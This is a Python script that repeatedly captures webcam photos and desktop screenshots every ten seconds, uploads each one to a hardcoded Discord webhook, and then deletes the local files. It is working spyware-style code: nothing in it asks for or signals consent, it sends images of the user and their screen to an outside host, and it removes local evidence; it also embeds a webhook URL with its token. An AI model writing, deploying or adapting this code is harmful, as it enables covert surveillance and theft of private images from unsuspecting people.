import cv2
import time
import requests
import os
import pyautogui

# Your Discord webhook URL here
DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1411495981228494902/atQpNY106YVLvT0tovJaialcHT_fhJnMI204MdmVF8hrEJWAwiYXvtqZlPhbWU0_TmWb'
CAPTURE_INTERVAL = 10  # seconds between captures

def capture_webcam_image(cap):
    # Try to grab a frame within 1 second max (10 tries * 0.1s)
    for _ in range(10):
        ret, frame = cap.read()
        if ret and frame is not None:
            filename = f"webcam_{int(time.time() * 1000)}.jpg"
            cv2.imwrite(filename, frame)
            print(f"[✓] Webcam image captured: {filename}")
            return filename
        time.sleep(0.1)
    print("[✗] Failed to capture webcam image.")
    return None

def capture_screenshot():
    filename = f"screenshot_{int(time.time() * 1000)}.png"
    image = pyautogui.screenshot()
    image.save(filename)
    print(f"[✓] Screenshot captured: {filename}")
    return filename

def send_file_to_discord(filepath, message):
    try:
        with open(filepath, 'rb') as f:
            files = {'file': (os.path.basename(filepath), f)}
            data = {
                "content": message,
                "username": "Image Sender"  # Sets webhook display name
            }
            response = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
        if response.status_code == 204:
            print(f"[✓] Sent to Discord: {filepath}")
        else:
            print(f"[✗] Failed to send {filepath}. Status code: {response.status_code}")
    except Exception as e:
        print(f"[!] Exception sending {filepath} to Discord: {e}")

def main_loop():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("[✗] Could not open webcam.")
        return
    print("[✓] Webcam opened.")

    try:
        while True:
            # Capture and send webcam image
            webcam_file = capture_webcam_image(cap)
            if webcam_file:
                send_file_to_discord(webcam_file, "📸 Webcam capture")
                os.remove(webcam_file)
                print(f"[-] Deleted local webcam file: {webcam_file}")
            else:
                print("[!] Skipping webcam capture this round.")

            # Capture and send screenshot
            screenshot_file = capture_screenshot()
            send_file_to_discord(screenshot_file, "🖥️ Screenshot capture")
            os.remove(screenshot_file)
            print(f"[-] Deleted local screenshot file: {screenshot_file}")

            # Wait before next capture
            time.sleep(CAPTURE_INTERVAL)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user, exiting.")
    finally:
        cap.release()
        cv2.destroyAllWindows()
        print("[✓] Cleaned up camera and windows.")

if __name__ == "__main__":
    main_loop()
